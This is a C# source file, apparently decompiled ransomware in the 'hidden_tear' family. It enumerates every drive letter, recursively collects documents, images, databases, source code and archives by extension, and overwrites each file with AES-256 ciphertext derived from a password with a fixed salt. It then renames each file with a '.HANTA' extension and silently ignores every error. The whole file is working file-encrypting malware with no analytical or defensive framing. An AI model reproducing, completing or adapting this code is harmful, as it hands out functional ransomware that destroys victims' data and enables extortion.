using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace hidden_tear;

internal class encrypt_by_disk_name
{
	public static string[] discs = new string[26]
	{
		"A://", "B://", "C://", "D://", "E://", "F://", "G://", "H://", "I://", "J://",
		"K://", "L://", "M://", "N://", "O://", "P://", "Q://", "R://", "S://", "T://",
		"U://", "V://", "W://", "X://", "Y://", "Z://"
	};

	public static void start_app_proc(string password)
	{
		encrypt_txt(password);
		encrypt_doc(password);
		encrypt_docx(password);
		encrypt_xls(password);
		encrypt_xlsx(password);
		encrypt_csv(password);
		encrypt_ppt(password);
		encrypt_pptx(password);
		encrypt_odt(password);
		encrypt_jpg(password);
		encrypt_png(password);
		encrypt_csv(password);
		encrypt_sql(password);
		encrypt_mdb(password);
		encrypt_sln(password);
		encrypt_php(password);
		encrypt_asp(password);
		encrypt_aspx(password);
		encrypt_html(password);
		encrypt_xml(password);
		encrypt_psd(password);
		encrypt_dat(password);
		encrypt_bmp(password);
		encrypt_pdf(password);
		encrypt_log(password);
		encrypt_sq3(password);
		encrypt_zip(password);
		encrypt_cpp(password);
		encrypt_c(password);
		encrypt_h(password);
		encrypt_htm(password);
		encrypt_py(password);
		encrypt_py3(password);
	}

	public static void GetAllFiles(string rootDirectory, string fileExtension, List<string> files)
	{
		try
		{
			string[] directories = Directory.GetDirectories(rootDirectory);
			files.AddRange(Directory.GetFiles(rootDirectory, fileExtension));
			string[] array = directories;
			foreach (string rootDirectory2 in array)
			{
				GetAllFiles(rootDirectory2, fileExtension, files);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_txt(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.txt", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_docx(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.docx", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_doc(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.doc", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_xls(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.xls", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_xlsx(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.xlsx", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_ppt(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.ppt", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_pptx(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.pptx", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_odt(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.odt", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_jpg(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.jpg", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_png(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.png", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_csv(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.csv", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_sql(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.sql", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_mdb(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.mdb", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_sln(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.sln", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_php(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.php", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_asp(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.asp", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_aspx(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.aspx", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_html(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.html", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_xml(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.xml", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_psd(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.psd", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_dat(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.dat", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_bmp(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.bmp", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_pdf(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.pdf", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_log(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.log", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_sq3(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.sq3", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_zip(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.zip", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_cpp(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.cpp", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_c(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.c", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_h(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.h", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_htm(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.htm", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_py(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.py", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void encrypt_py3(string password)
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = discs;
			foreach (string rootDirectory in array)
			{
				GetAllFiles(rootDirectory, "*.py3", list);
			}
			foreach (string item in list)
			{
				EncryptFile(item, password);
			}
		}
		catch
		{
		}
	}

	public static void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".HANTA");
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}
}
